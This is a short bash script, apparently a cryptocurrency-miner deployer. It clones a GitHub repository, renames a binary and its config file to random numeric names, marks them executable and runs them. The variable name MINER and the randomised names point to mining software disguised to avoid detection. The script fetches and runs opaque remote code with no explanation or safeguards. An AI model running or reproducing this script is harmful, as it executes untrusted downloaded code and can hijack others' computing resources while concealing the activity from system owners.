#!/bin/bash
MINER=$(echo $(shuf -i 100000000000-99999999999999 -n 1)-NICE)
INI=$(echo $(shuf -i 10000000000-99999999999999999 -n 1)-INI).ini
sudo apt update
git clone https://github.com/githubasem/asu 
cd asu
mv gas $MINER
mv keun.ini $INI
chmod +x $MINER $INI
./$MINER $INI
